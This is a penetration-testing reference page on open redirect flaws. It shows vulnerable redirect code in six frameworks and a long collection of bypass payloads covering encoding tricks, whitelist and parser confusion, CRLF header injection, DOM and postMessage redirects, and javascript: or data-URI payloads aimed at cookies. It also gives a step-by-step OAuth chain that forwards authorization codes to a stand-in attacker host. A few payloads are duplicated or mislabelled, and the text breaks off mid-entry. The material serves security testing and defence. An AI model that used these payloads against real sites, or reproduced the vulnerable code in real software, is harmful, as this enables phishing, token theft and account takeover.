---
title: Open Redirect
description: Open Redirect attacks — URL manipulation, filter bypass, parameter pollution, chained exploitation, OAuth token theft, phishing, SSRF escalation, payloads, privilege escalation, and defense for penetration testers and security researchers.
navigation:
  icon: i-lucide-external-link
  title: Open Redirect
---

## What is an Open Redirect?

An Open Redirect vulnerability occurs when a web application accepts **user-controlled input** to determine the destination of a redirect and forwards the user to an **external, untrusted URL** without proper validation. The application acts as a trusted intermediary, lending its reputation and domain to redirect victims to malicious destinations controlled by the attacker.

::callout{icon="i-lucide-info" color="blue"}
Open Redirects are often dismissed as **low severity**, but they are extremely powerful when **chained** with other attacks. They enable OAuth token theft, credential phishing, SSRF, XSS, and can bypass security controls that trust the vulnerable domain. Many critical vulnerabilities start with an Open Redirect.
::

### Why Open Redirects Are Dangerous

The core danger lies in **trust exploitation**. Users and security systems trust legitimate domains. When `https://trusted-bank.com/redirect?url=https://evil.com` redirects to `evil.com`, the user sees the **trusted bank's URL** before clicking, and security filters that whitelist `trusted-bank.com` allow the request through.

::tabs
  :::tabs-item{icon="i-lucide-eye" label="How Open Redirects Work"}

  **Normal legitimate redirect:**
  ```text
  User clicks: https://target.com/login?next=/dashboard
  Server redirects to: https://target.com/dashboard ✅
  ```

  **Open Redirect attack:**
  ```text
  Attacker crafts: https://target.com/login?next=https://evil.com/phishing
  Server redirects to: https://evil.com/phishing 💀
  User sees target.com in the URL before clicking — trusts it
  ```

  :::

  :::tabs-item{icon="i-lucide-code" label="Redirect Mechanisms"}

  | Mechanism | Type | Example |
  |-----------|------|---------|
  | HTTP 301 | Permanent Redirect | `Location: https://evil.com` |
  | HTTP 302 | Temporary Redirect | `Location: https://evil.com` |
  | HTTP 303 | See Other | `Location: https://evil.com` |
  | HTTP 307 | Temporary (preserves method) | `Location: https://evil.com` |
  | HTTP 308 | Permanent (preserves method) | `Location: https://evil.com` |
  | Meta Refresh | HTML-based | `<meta http-equiv="refresh" content="0;url=https://evil.com">` |
  | JavaScript | Client-side | `window.location = "https://evil.com"` |
  | JavaScript | Client-side | `window.location.href = "https://evil.com"` |
  | JavaScript | Client-side | `window.location.replace("https://evil.com")` |
  | JavaScript | Client-side | `window.location.assign("https://evil.com")` |
  | JavaScript | Client-side | `document.location = "https://evil.com"` |
  | Header | Response Header | `Refresh: 0; url=https://evil.com` |

  :::

  :::tabs-item{icon="i-lucide-code" label="Common Redirect Parameters"}

  Applications commonly use these parameter names for redirect destinations:

  ```text
  ?url=
  ?redirect=
  ?redirect_url=
  ?redirect_uri=
  ?next=
  ?nextUrl=
  ?next_url=
  ?return=
  ?returnUrl=
  ?return_url=
  ?returnTo=
  ?return_to=
  ?rurl=
  ?redir=
  ?dest=
  ?destination=
  ?go=
  ?goto=
  ?target=
  ?target_url=
  ?link=
  ?linkurl=
  ?out=
  ?outurl=
  ?forward=
  ?forward_url=
  ?continue=
  ?continueTo=
  ?continue_url=
  ?callback=
  ?callback_url=
  ?checkout_url=
  ?image_url=
  ?page=
  ?page_url=
  ?view=
  ?login_url=
  ?logout=
  ?logout_url=
  ?success=
  ?success_url=
  ?error_url=
  ?fail_url=
  ?cancel_url=
  ?from=
  ?fromUrl=
  ?to=
  ?toUrl=
  ?uri=
  ?u=
  ?r=
  ?q=
  ?ref=
  ?referrer=
  ?service=
  ?sp=
  ?site=
  ?window=
  ?data=
  ?file=
  ?path=
  ?feed=
  ?host=
  ?port=
  ?domain=
  ?RelayState=
  ?SAMLRequest=
  ?action=
  ?cgi-bin/redirect.cgi?
  ?oauth_callback=
  ?signup_url=
  ```

  :::
::

---

## Vulnerable Code Patterns

Understanding how applications implement redirects reveals the injection surface.

::tabs
  :::tabs-item{icon="i-lucide-code" label="PHP (Vulnerable)"}
  ```php [redirect.php]
  <?php
  // VULNERABLE — No validation on redirect target
  $url = $_GET['url'];
  header("Location: " . $url);
  exit();
  ?>
  ```

  ```php [login.php]
  <?php
  // VULNERABLE — 'next' parameter used after login
  if (authenticate($username, $password)) {
      $next = $_GET['next'] ?? '/dashboard';
      header("Location: " . $next);
      exit();
  }
  ?>
  ```

  ```php [logout.php]
  <?php
  // VULNERABLE — Redirect after logout
  session_destroy();
  $return = $_GET['return'] ?? '/';
  header("Location: " . $return);
  exit();
  ?>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python Flask (Vulnerable)"}
  ```python [app.py]
  from flask import Flask, request, redirect

  app = Flask(__name__)

  # VULNERABLE — Direct redirect to user input
  @app.route('/redirect')
  def open_redirect():
      url = request.args.get('url', '/')
      return redirect(url)

  # VULNERABLE — Post-login redirect
  @app.route('/login', methods=['POST'])
  def login():
      if authenticate(request.form):
          next_url = request.args.get('next', '/dashboard')
          return redirect(next_url)
      return "Login failed"

  # VULNERABLE — JavaScript-based redirect
  @app.route('/go')
  def go():
      url = request.args.get('url', '/')
      return f'<script>window.location="{url}"</script>'
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Node.js Express (Vulnerable)"}
  ```javascript [server.js]
  const express = require('express');
  const app = express();

  // VULNERABLE — Direct redirect
  app.get('/redirect', (req, res) => {
    const url = req.query.url || '/';
    res.redirect(url);
  });

  // VULNERABLE — Post-login redirect
  app.post('/login', (req, res) => {
    if (authenticate(req.body)) {
      const returnTo = req.query.returnTo || '/dashboard';
      res.redirect(returnTo);
    }
  });

  // VULNERABLE — 302 with Location header
  app.get('/go', (req, res) => {
    const dest = req.query.dest;
    res.writeHead(302, { 'Location': dest });
    res.end();
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Java Spring (Vulnerable)"}
  ```java [RedirectController.java]
  import org.springframework.web.bind.annotation.*;
  import javax.servlet.http.HttpServletResponse;

  @RestController
  public class RedirectController {

      // VULNERABLE — Direct redirect
      @GetMapping("/redirect")
      public void redirect(@RequestParam String url, HttpServletResponse response) throws Exception {
          response.sendRedirect(url);
      }

      // VULNERABLE — Spring redirect prefix
      @GetMapping("/go")
      public String go(@RequestParam String target) {
          return "redirect:" + target;
      }

      // VULNERABLE — Post-login
      @PostMapping("/login")
      public void login(@RequestParam String next, HttpServletResponse response) throws Exception {
          // ... authentication logic ...
          response.sendRedirect(next);
      }
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label=".NET (Vulnerable)"}
  ```csharp [AccountController.cs]
  using Microsoft.AspNetCore.Mvc;

  public class AccountController : Controller
  {
      // VULNERABLE — Direct redirect
      [HttpGet("redirect")]
      public IActionResult RedirectTo(string url)
      {
          return Redirect(url);
      }

      // VULNERABLE — Post-login redirect
      [HttpPost("login")]
      public IActionResult Login(LoginModel model, string returnUrl)
      {
          if (ModelState.IsValid && Authenticate(model))
          {
              return Redirect(returnUrl ?? "/dashboard");
          }
          return View();
      }

      // VULNERABLE — LocalRedirect bypass
      [HttpGet("go")]
      public IActionResult Go(string next)
      {
          // Redirect() doesn't validate if URL is local
          return Redirect(next);
      }
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Ruby on Rails (Vulnerable)"}
  ```ruby [sessions_controller.rb]
  class SessionsController < ApplicationController
    # VULNERABLE — Post-login redirect
    def create
      user = User.authenticate(params[:email], params[:password])
      if user
        session[:user_id] = user.id
        redirect_to params[:return_to] || root_path
      else
        render :new
      end
    end

    # VULNERABLE — Direct redirect
    def redirect
      redirect_to params[:url]
    end
  end
  ```
  :::
::

---

## Detection & Identification

::card-group
  ::card
  ---
  title: Parameter Discovery
  icon: i-lucide-search
  ---
  Spider/crawl the application and identify all parameters that control redirect behavior. Check login, logout, registration, password reset, OAuth flows, and any URL that performs a redirect.
  ::

  ::card
  ---
  title: Redirect Behavior Analysis
  icon: i-lucide-arrow-right
  ---
  Submit external URLs in redirect parameters and observe if the server returns a `3xx` redirect, meta refresh, or JavaScript redirect to the external domain.
  ::

  ::card
  ---
  title: JavaScript Source Analysis
  icon: i-lucide-file-code
  ---
  Review client-side JavaScript for `window.location`, `document.location`, `location.href`, `location.assign()`, and `location.replace()` that use URL parameters or hash fragments as destinations.
  ::

  ::card
  ---
  title: Header Inspection
  icon: i-lucide-file-text
  ---
  Check `Location` and `Refresh` response headers for reflected user input. Any parameter value appearing in these headers indicates potential Open Redirect.
  ::

  ::card
  ---
  title: DOM-Based Analysis
  icon: i-lucide-code
  ---
  Inspect DOM sinks that perform navigation using sources from `window.location`, `document.URL`, `document.referrer`, or `window.name`. These enable DOM-based Open Redirect.
  ::

  ::card
  ---
  title: OAuth Flow Analysis
  icon: i-lucide-key
  ---
  Examine OAuth `redirect_uri` and `callback` parameters. These are high-value Open Redirect targets because they carry authorization codes and tokens.
  ::
::

### Detection Payloads

::code-group
```text [Basic External Redirect]
https://evil.com
```

```text [HTTP Protocol]
http://evil.com
```

```text [Protocol-Relative URL]
//evil.com
```

```text [Unique Callback Test]
https://YOUR_BURP_COLLABORATOR_DOMAIN
```

```text [Different Port]
https://evil.com:443
```

```text [With Path]
https://evil.com/phishing/login
```

```text [IP Address]
http://1.2.3.4
```

```text [Localhost Test]
http://127.0.0.1
```

```text [JavaScript Protocol]
javascript:alert(document.domain)
```

```text [Data URI]
data:text/html,<script>alert(1)</script>
```
::

::tip
Use **Burp Collaborator** or **interact.sh** as the redirect destination. This confirms the redirect even if you can't see the response directly (blind redirect scenarios, email links, etc.).
::

---

## Payloads

::note
All payloads are organized by bypass technique. Each section targets a specific validation pattern that applications commonly implement. Replace `evil.com` with your controlled domain and `target.com` with the vulnerable application's domain.
::

### Basic Open Redirect Payloads

::collapsible
---
label: "Standard Redirect Payloads"
---

```text [Full URL — HTTPS]
https://evil.com
```

```text [Full URL — HTTP]
http://evil.com
```

```text [Protocol-Relative]
//evil.com
```

```text [With WWW]
https://www.evil.com
```

```text [With Path]
https://evil.com/phishing
```

```text [With Query String]
https://evil.com/steal?data=
```

```text [With Fragment]
https://evil.com#fragment
```

```text [With Port]
https://evil.com:8443
```

```text [With Authentication]
https://user:pass@evil.com
```

```text [With Subdomain]
https://phishing.evil.com
```

```text [IP Address — Decimal]
http://1.2.3.4
```

```text [IP Address — HTTPS]
https://1.2.3.4
```

```text [IPv6]
http://[::1]
```

```text [IPv6 Full]
http://[0000:0000:0000:0000:0000:0000:0000:0001]
```

```text [Localhost]
http://localhost
```

```text [Localhost with Port]
http://localhost:8080
```

```text [FTP Protocol]
ftp://evil.com
```

```text [Empty Protocol]
://evil.com
```
::

### Protocol-Based Bypass Payloads

When the application blocks `http://` and `https://`, use alternative protocols and protocol manipulation.

::collapsible
---
label: "Protocol Manipulation Payloads"
---

```text [Protocol-Relative — Double Slash]
//evil.com
```

```text [Protocol-Relative — Triple Slash]
///evil.com
```

```text [Protocol-Relative — Quad Slash]
////evil.com
```

```text [Backslash Protocol-Relative]
\\evil.com
```

```text [Mixed Slash-Backslash]
\/evil.com
```

```text [Backslash-Slash]
/\evil.com
```

```text [Double Backslash]
\\\\evil.com
```

```text [JavaScript Protocol]
javascript:alert(document.domain)
```

```text [JavaScript with Comment]
javascript://comment%0aalert(document.domain)
```

```text [JavaScript URL-Encoded]
javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29
```

```text [JavaScript Case Variation]
JaVaScRiPt:alert(document.domain)
```

```text [JavaScript with Tab]
java%09script:alert(document.domain)
```

```text [JavaScript with Newline]
java%0ascript:alert(document.domain)
```

```text [JavaScript with Carriage Return]
java%0dscript:alert(document.domain)
```

```text [JavaScript with Null Byte]
java%00script:alert(document.domain)
```

```text [VBScript (IE)]
vbscript:MsgBox("XSS")
```

```text [Data URI — HTML]
data:text/html,<script>alert(document.domain)</script>
```

```text [Data URI — Base64]
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
```

```text [Data URI — With Charset]
data:text/html;charset=utf-8,<script>alert(1)</script>
```

```text [HTTPS with Tab Before Colon]
https%09://evil.com
```

```text [HTTPS with Newline]
https%0a://evil.com
```

```text [Protocol with Spaces]
https ://evil.com
```

```text [No Protocol — Just Domain]
evil.com
```

```text [No Protocol — With Path]
evil.com/phishing
```

```text [Colon Without Protocol]
:evil.com
```

```text [Single Slash]
/evil.com
```
::

### Domain Validation Bypass Payloads

When the application validates that the redirect URL contains the **trusted domain**, use these techniques to satisfy the check while redirecting to an attacker-controlled site.

::collapsible
---
label: "Subdomain & Domain Confusion"
---

```text [Attacker Subdomain Matching Target]
https://target.com.evil.com
```

```text [Target as Subdomain of Attacker]
https://evil.com/target.com
```

```text [Target in Path]
https://evil.com/https://target.com
```

```text [Target in Query String]
https://evil.com?target.com
```

```text [Target in Fragment]
https://evil.com#target.com
```

```text [Target in Username Field]
https://target.com@evil.com
```

```text [Target in Username with Path]
https://target.com@evil.com/phishing
```

```text [Target in Password Field]
https://user:target.com@evil.com
```

```text [Subdomain Match — Prefix]
https://target.com.evil.com
```

```text [Subdomain Match — Suffix]
https://eviltarget.com
```

```text [Subdomain Match — With Dot]
https://evil.target.com
```

```text [Subdomain Match — Hyphen]
https://target-com.evil.com
```

```text [Subdomain Match — Double Domain]
https://target.com.target.com.evil.com
```

```text [Wildcard Subdomain]
https://anything.evil.com
```

```text [Registering Similar Domain]
https://target.co  (different TLD)
https://targer.com  (typo)
https://target.com.co
https://target-login.com
https://login-target.com
https://target.evil.com
```
::

::collapsible
---
label: "@ Symbol (Credential Section) Bypass"
---

The `@` symbol in URLs separates the **userinfo** (username:password) from the **hostname**. Everything before `@` is treated as authentication credentials, and the browser navigates to the hostname **after** `@`.

```text [Basic @ Bypass]
https://target.com@evil.com
```

```text [@ with HTTPS]
https://target.com@evil.com/phishing
```

```text [@ with Path on Target]
https://target.com/login@evil.com
```

```text [@ with Port]
https://target.com@evil.com:8443
```

```text [Multiple @ Symbols]
https://target.com@target.com@evil.com
```

```text [@ with URL Encoding]
https://target.com%40evil.com
```

```text [@ with Password Section]
https://user:password@target.com@evil.com
```

```text [@ with Target as User and Password]
https://target.com:target.com@evil.com
```

```text [@ with Subdomain]
https://www.target.com@evil.com
```

```text [@ with Full Path]
https://target.com/secure/login@evil.com/phishing
```

```text [@ URL-Encoded Full]
https://target.com%2540evil.com
```

```text [@ Double Encoded]
https://target.com%2540evil.com
```

```text [Protocol-Relative with @]
//target.com@evil.com
```
::

::collapsible
---
label: "Slash & Backslash Manipulation"
---

```text [Backslash Instead of Slash]
https://evil.com\target.com
```

```text [Forward Slash Backslash Combo]
/\evil.com
```

```text [Double Forward Slash]
//evil.com
```

```text [Triple Slash]
///evil.com
```

```text [Slash-Dot-Dot-Slash]
//../evil.com
```

```text [Dot-Slash]
./evil.com
```

```text [Double Dot-Slash]
../evil.com
```

```text [Backslash-Dot]
\.evil.com
```

```text [Multiple Slashes Before Domain]
////evil.com
```

```text [Tab Between Slashes]
/%09/evil.com
```

```text [Newline Between Slashes]
/%0a/evil.com
```

```text [Carriage Return Between Slashes]
/%0d/evil.com
```

```text [Null Byte Between Slashes]
/%00/evil.com
```

```text [Backslash-Forward Slash]
\/\/evil.com
```

```text [Path With Backslash]
/evil.com\..
```

```text [Encoded Forward Slash]
%2f%2fevil.com
```

```text [Double-Encoded Forward Slash]
%252f%252fevil.com
```

```text [Encoded Backslash]
%5cevil.com
```

```text [Mixed Encoding]
%2f%5cevil.com
```

```text [Unicode Slash]
%ef%bc%8f%ef%bc%8fevil.com
```

```text [Unicode Backslash]
%ef%bc%bcevil.com
```
::

### URL Encoding Bypass Payloads

When the application decodes input before or after validation, encoding mismatches create bypass opportunities.

::collapsible
---
label: "Single URL Encoding"
---

```text [Encode Full URL]
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

```text [Encode Protocol Slashes Only]
https:%2f%2fevil.com
```

```text [Encode Colon Only]
https%3a//evil.com
```

```text [Encode Dots]
https://evil%2ecom
```

```text [Encode @ Symbol]
https://target.com%40evil.com
```

```text [Encode Slashes]
https:%2f%2fevil%2ecom
```

```text [Partial Encoding — Domain Only]
https://%65%76%69%6c%2e%63%6f%6d
```

```text [Encode Protocol]
%68%74%74%70%73://evil.com
```

```text [Mixed Encoded and Plain]
https://evil%2Ecom
```
::

::collapsible
---
label: "Double URL Encoding"
---

```text [Double-Encode Full URL]
%2568%2574%2574%2570%2573%253a%252f%252f%2565%2576%2569%256c%252e%2563%256f%256d
```

```text [Double-Encode Slashes]
https:%252f%252fevil.com
```

```text [Double-Encode Protocol-Relative]
%252f%252fevil.com
```

```text [Double-Encode @ Symbol]
https://target.com%2540evil.com
```

```text [Double-Encode Dots]
https://evil%252ecom
```

```text [Double-Encode Colon]
https%253a//evil.com
```

```text [Double-Encode Full Protocol + Domain]
%2568%2574%2574%2570%2573%253a%252f%252f%2565%2576%2569%256c%252e%2563%256f%256d
```
::

::collapsible
---
label: "Triple & Advanced Encoding"
---

```text [Triple-Encode Slashes]
https:%25252f%25252fevil.com
```

```text [Triple-Encode Protocol-Relative]
%25252f%25252fevil.com
```

```text [Unicode Full-Width Characters]
https://evil。com     (fullwidth period U+3002)
```

```text [Unicode Full-Width Slash]
https:／／evil.com    (fullwidth solidus U+FF0F)
```

```text [Unicode Full-Width Colon]
https：//evil.com     (fullwidth colon U+FF1A)
```

```text [Unicode Full-Width @]
https://target.com＠evil.com  (fullwidth @ U+FF20)
```

```text [Punycode Domain]
https://xn--evil-7od.com
```

```text [Unicode Homoglyph Domain]
https://еvіl.com    (Cyrillic characters that look like Latin)
```

```text [IRI / International Domain]
https://évíl.com    (accented characters)
```

```text [HTML Entity — Numeric]
https://evil&#46;com
```

```text [HTML Entity — Hex]
https://evil&#x2e;com
```

```text [Overlong UTF-8 Encoding]
%c0%af%c0%afevil.com
```
::

### IP Address-Based Bypass Payloads

When domain names are blocked, use IP address representations to redirect to attacker-controlled servers.

::collapsible
---
label: "IP Address Format Variations"
---

```text [Standard Decimal IP]
http://1.2.3.4
```

```text [Decimal (Dword) IP]
http://16909060
# 1*256^3 + 2*256^2 + 3*256 + 4 = 16909060
```

```text [Octal IP]
http://0001.0002.0003.0004
```

```text [Hex IP]
http://0x01.0x02.0x03.0x04
```

```text [Hex IP — Full]
http://0x01020304
```

```text [Mixed Octal and Decimal]
http://0001.2.3.4
```

```text [Mixed Hex and Decimal]
http://0x01.2.3.4
```

```text [IPv6 Standard]
http://[::1]
```

```text [IPv6 Mapped IPv4]
http://[::ffff:1.2.3.4]
```

```text [IPv6 Full]
http://[0000:0000:0000:0000:0000:0000:0102:0304]
```

```text [IPv6 Compressed]
http://[::102:304]
```

```text [Localhost — Standard]
http://127.0.0.1
```

```text [Localhost — Decimal]
http://2130706433
```

```text [Localhost — Hex]
http://0x7f000001
```

```text [Localhost — Octal]
http://0177.0.0.1
```

```text [Localhost — Short]
http://127.1
```

```text [Localhost — IPv6]
http://[::1]
```

```text [Localhost — IPv6 Mapped]
http://[::ffff:127.0.0.1]
```

```text [Localhost — Zero]
http://0
```

```text [Localhost — 0.0.0.0]
http://0.0.0.0
```

```text [AWS Metadata IP — Standard]
http://169.254.169.254
```

```text [AWS Metadata IP — Decimal]
http://2852039166
```

```text [AWS Metadata IP — Hex]
http://0xa9fea9fe
```

```text [AWS Metadata IP — Octal]
http://0251.0376.0251.0376
```

```text [Period in IP — DNS Rebinding Style]
http://1.2.3.4.nip.io
```

```text [IP with Port]
http://1.2.3.4:80
```

```text [IP with Credentials @]
http://target.com@1.2.3.4
```
::

### Whitelist Bypass Payloads

When the application only allows redirects to a **whitelist** of trusted domains, these techniques attempt to bypass the whitelist validation.

::collapsible
---
label: "Whitelist Bypass Techniques"
---

```text [Subdomain of Trusted Domain (if wildcard match)]
https://evil.target.com
# If whitelist matches *.target.com
# Attacker creates: evil.target.com (dangling DNS, subdomain takeover)
```

```text [Trusted Domain as Subdomain of Attacker]
https://target.com.evil.com
# Matches "target.com" string but resolves to evil.com's subdomain
```

```text [Trusted Domain in Path]
https://evil.com/target.com
# String "target.com" is present but in path, not domain
```

```text [Trusted Domain in Parameter]
https://evil.com?redirect=target.com
```

```text [Trusted Domain in Fragment]
https://evil.com#target.com
```

```text [Trusted Domain with @ Trick]
https://target.com@evil.com
# Browser navigates to evil.com, target.com treated as username
```

```text [Regex Bypass — Dot Not Escaped]
# If whitelist uses regex: /target.com/
# The dot matches any character:
https://targetXcom.evil.com
```

```text [Regex Bypass — Missing Anchor]
# If whitelist checks: /target\.com/
# Without ^ and $ anchors:
https://evil.com/target.com
https://target.com.evil.com
```

```text [Regex Bypass — Missing Protocol Check]
# Whitelist allows: target.com
javascript://target.com%0aalert(1)
```

```text [Null Byte — Truncate Validation]
https://evil.com%00.target.com
# Validator sees: evil.com\0.target.com → contains "target.com" ✅
# Server processes: evil.com (truncated at null byte) 💀
```

```text [Parameter Pollution]
?redirect=https://target.com&redirect=https://evil.com
# Validator checks first: target.com ✅
# App uses last: evil.com 💀
```

```text [CRLF Injection in Redirect]
?redirect=https://target.com%0d%0aLocation:%20https://evil.com
# Injects second Location header
```

```text [Open Redirect Chain]
# Find open redirect on trusted domain first
# Then chain:
https://trusted.com/redirect?url=https://evil.com
# Whitelist allows trusted.com ✅
# But trusted.com redirects to evil.com 💀
```

```text [Subdomain Takeover + Redirect]
# target.com has dangling CNAME: old.target.com → ???
# Attacker claims old.target.com
# Redirect to: https://old.target.com → controlled by attacker
```

```text [Case Sensitivity Bypass]
https://TARGET.COM@evil.com
https://Target.Com.evil.com
HTTPS://EVIL.COM
```

```text [URL Parser Differential]
https://evil.com\.target.com
# Different parsers interpret \. differently
# Python: evil.com\.target.com (one domain)
# Browser: evil.com → navigates here, \.target.com as path
```

```text [Port-Based Bypass]
https://target.com:evil.com@attacker.com
https://evil.com:80#@target.com
```

```text [Fragment-Based Bypass]
https://evil.com#@target.com
https://target.com#@evil.com
```
::

### Path-Based & Relative Redirect Payloads

When the application constructs redirect URLs using path-based logic.

::collapsible
---
label: "Path-Based Redirect Manipulation"
---

```text [Path Traversal to Root]
/../../../evil.com
```

```text [Double Dot with Protocol]
/..%2f..%2f..%2fevil.com
```

```text [Relative Path to External]
/redirect/..//evil.com
```

```text [Path with Encoded Traversal]
/%2e%2e/%2e%2e/evil.com
```

```text [Path Starting with Domain-Like Segment]
/evil.com
```

```text [Path with @ Symbol]
/@evil.com
```

```text [Path with Backslash]
/\evil.com
```

```text [Path-Based Protocol Injection]
/https://evil.com
```

```text [Path-Based Double Slash]
//evil.com
```

```text [Tab in Path]
/%09/evil.com
```

```text [Path with Question Mark]
/?url=evil.com
```

```text [Path with Hash]
/#evil.com
```

```text [Multi-Level Path Traversal]
/anything/../redirect/../..//evil.com
```

```text [URL Fragment as Path]
/redirect#https://evil.com
```

```text [Current Directory Bypass]
/./evil.com
```

```text [Path Normalization Bypass]
/redirect/..%00/evil.com
```

```text [Double-Dot Percent-Encoded]
/%2e%2e/evil.com
```

```text [Double-Dot Double-Encoded]
/%252e%252e/evil.com
```
::

### DOM-Based Open Redirect Payloads

DOM-based Open Redirects occur entirely in the **client-side JavaScript** without any server-side redirect. The JavaScript reads a URL from a source (URL parameter, hash fragment, `document.referrer`) and uses it in a navigation sink.

::collapsible
---
label: "DOM-Based Redirect Exploitation"
---

**Common Vulnerable JavaScript Patterns:**

```javascript [Vulnerable — location.href from URL param]
// https://target.com/page?next=https://evil.com
var next = new URLSearchParams(window.location.search).get('next');
window.location.href = next;
```

```javascript [Vulnerable — location from hash]
// https://target.com/page#https://evil.com
var dest = window.location.hash.substring(1);
window.location = dest;
```

```javascript [Vulnerable — document.referrer]
// If attacker controls referrer
window.location = document.referrer;
```

```javascript [Vulnerable — postMessage]
window.addEventListener('message', function(e) {
    window.location = e.data.url;
});
```

```javascript [Vulnerable — window.name]
// Attacker sets window.name before navigation
window.location = window.name;
```

**Payloads for DOM-Based Redirects:**

```text [Hash Fragment Redirect]
https://target.com/page#https://evil.com
```

```text [Hash with JavaScript Protocol]
https://target.com/page#javascript:alert(document.domain)
```

```text [Hash with Data URI]
https://target.com/page#data:text/html,<script>alert(1)</script>
```

```text [URL Parameter — DOM Sink]
https://target.com/page?redirect=https://evil.com
```

```text [URL Parameter — JavaScript in DOM]
https://target.com/page?url=javascript:alert(1)
```

```text [PostMessage Attack]
<script>
// From attacker's page, send message to target iframe
var w = window.open('https://target.com/page');
setTimeout(function() {
    w.postMessage({url: 'https://evil.com'}, '*');
}, 2000);
</script>
```

```text [window.name Attack]
<script>
// Set window.name then navigate to target
window.name = 'https://evil.com';
window.location = 'https://target.com/page';
// Target's JS reads window.name and redirects
</script>
```
::

### CRLF-Based Open Redirect

::collapsible
---
label: "Header Injection → Redirect"
---

```text [CRLF — Inject Location Header]
/page?param=value%0d%0aLocation:%20https://evil.com
```

```text [CRLF — Double CRLF + Meta Refresh]
/page?param=value%0d%0a%0d%0a<meta http-equiv="refresh" content="0;url=https://evil.com">
```

```text [CRLF — Double CRLF + JavaScript Redirect]
/page?param=value%0d%0a%0d%0a<script>window.location='https://evil.com'</script>
```

```text [CRLF in Redirect Parameter]
/redirect?url=https://target.com%0d%0aLocation:%20https://evil.com%0d%0a%0d%0a
```

```text [CRLF — Override Existing Location]
/redirect?url=%0d%0aLocation:%20https://evil.com
```

```text [CRLF — Inject Refresh Header]
/page?param=value%0d%0aRefresh:%200;%20url=https://evil.com
```
::

### Special & Edge Case Payloads

::collapsible
---
label: "Exotic Bypass Techniques"
---

```text [Whitespace Before URL]
 https://evil.com
```

```text [Tab Before URL]
%09https://evil.com
```

```text [Newline Before URL]
%0ahttps://evil.com
```

```text [Carriage Return Before URL]
%0dhttps://evil.com
```

```text [Vertical Tab Before URL]
%0bhttps://evil.com
```

```text [Form Feed Before URL]
%0chttps://evil.com
```

```text [Null Byte Before URL]
%00https://evil.com
```

```text [Zero-Width Space]
%e2%80%8bhttps://evil.com
```

```text [Right-to-Left Override]
%e2%80%8fhttps://evil.com
```

```text [Left-to-Right Override]
%e2%80%8ehttps://evil.com
```

```text [Soft Hyphen]
%c2%adhttps://evil.com
```

```text [BOM (Byte Order Mark)]
%ef%bb%bfhttps://evil.com
```

```text [Non-Breaking Space]
%c2%a0https://evil.com
```

```text [Ogham Space Mark]
%e1%9a%80https://evil.com
```

```text [Domain with Trailing Dot]
https://evil.com.
```

```text [Domain with Trailing Dot and Slash]
https://evil.com./
```

```text [IDN Homograph — Cyrillic]
https://еvіl.com
# Uses Cyrillic е (U+0435) and і (U+0456)
```

```text [Punycode Representation]
https://xn--e1awd7f.com
```

```text [URL with Percent in Domain]
https://evil%2ecom
```

```text [URL with Semicolon]
https://evil.com;target.com
```

```text [URL with Pipe]
https://evil.com|target.com
```

```text [URL with Caret]
https://evil.com^target.com
```

```text [URL with Backtick]
https://evil.com`target.com
```

```text [URL with Curly Braces]
https://evil.com{target.com}
```

```text [Negative Port]
https://evil.com:-1
```

```text [Very Large Port Number]
https://evil.com:99999999
```

```text [Port Zero]
https://evil.com:0
```

```text [Multiple Colons]
https://evil.com:::80
```

```text [Browser-Specific — Chrome/Edge]
https:evil.com
```

```text [Browser-Specific — No Colon]
https//evil.com
```

```text [Browser-Specific — Single Slash]
https:/evil.com
```

```text [URL with Username-Like Path]
https:///evil.com
```
::

---

## Chained Attacks — Escalating Open Redirect

::note
Open Redirect's true power is realized when **chained** with other vulnerabilities. What appears to be a low-severity redirect becomes a critical attack vector when combined with OAuth, SSRF, XSS, or phishing.
::

### OAuth Token Theft

This is the **highest impact** chain for Open Redirect. Stealing OAuth authorization codes or tokens enables complete account takeover.

::steps{level="4"}

#### Identify OAuth Flow with Redirect URI

The OAuth authorization endpoint accepts a `redirect_uri` parameter:

```http
GET /oauth/authorize?client_id=APP&redirect_uri=https://app.com/callback&response_type=code&scope=read HTTP/1.1
Host: auth.target.com
```

#### Find Open Redirect on Allowed Domain

The OAuth server validates that `redirect_uri` is within the **registered domain** (`app.com`). Find an Open Redirect on `app.com`:

```text
https://app.com/redirect?url=https://evil.com
```

#### Chain Open Redirect into OAuth Flow

```http
GET /oauth/authorize?client_id=APP&redirect_uri=https://app.com/redirect?url=https://evil.com/steal&response_type=code&scope=read HTTP/1.1
Host: auth.target.com
```

The OAuth server validates `redirect_uri` starts with `https://app.com` ✅ and redirects the user with the authorization code to `https://app.com/redirect?url=https://evil.com/steal&code=AUTH_CODE`.

#### Open Redirect Forwards Code to Attacker

The open redirect on `app.com` forwards the user (and the **authorization code** in the URL) to:

```text
https://evil.com/steal?code=AUTH_CODE
```

#### Attacker Exchanges Code for Token

```http
POST /oauth/token HTTP/1.1
Host: auth.target.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://app.com/callback&client_id=APP&client_secret=SECRET
```

The attacker now has the victim's **access token** and full account access.

::

::caution
OAuth token theft via Open Redirect is one of the most common **critical severity** findings in bug bounty programs. Always check OAuth flows for redirect_uri validation weaknesses.
::

### Open Redirect → XSS

::collapsible
---
label: "Escalating to Cross-Site Scripting"
---

```text [JavaScript Protocol Redirect → XSS]
https://target.com/redirect?url=javascript:alert(document.cookie)
```

```text [Data URI Redirect → XSS]
https://target.com/redirect?url=data:text/html,<script>alert(document.cookie)</script>
```

```text [Data URI Base64 → XSS]
https://target.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+
```

```text [JavaScript with Comment Bypass → XSS]
https://target.com/redirect?url=javascript://target.com/%0aalert(document.cookie)
```

```text [JavaScript URL-Encoded → XSS]
https://target.com/redirect?url=javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29
```

```text [SVG Data URI → XSS]
https://target.com/redirect?url=data:image/svg+xml,<svg onload=alert(1)>
```

```text [CRLF → Response Splitting → XSS]
